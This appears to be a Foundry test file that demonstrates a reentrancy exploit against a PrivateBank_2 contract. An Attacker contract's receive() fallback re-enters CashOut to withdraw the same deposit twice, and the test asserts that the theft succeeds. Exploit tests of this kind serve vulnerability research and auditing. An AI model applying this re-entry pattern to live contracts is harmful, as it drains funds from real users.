
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {
    
    PrivateBank_2 public privateBank;
    Log public logLib;
    Attacker public _attacker;

    function setUp() public {
        logLib = new Log();
        privateBank = new PrivateBank_2(address(logLib));
        
        _attacker = new Attacker(address(privateBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required beyond funding.

        // --- 3. Funding ---
        // Fund the Victim with enough ETH to be stolen (in addition to the deposit).
        vm.deal(address(privateBank), attackVal); 
        
        // Fund the Test Contract to pass value to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    PrivateBank_2 public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PrivateBank_2(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(victim).balance;

        // 3. Call the vulnerable function.
        victim.CashOut(val);

        // 4. Verify Success Conditions.
        // If we successfully re-entered, we withdrew 'val' twice.
        // The balance should be less than (Initial - 1 withdrawal).
        if (address(victim).balance < initialSnapshot - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(storedVal);
        }
    }
}
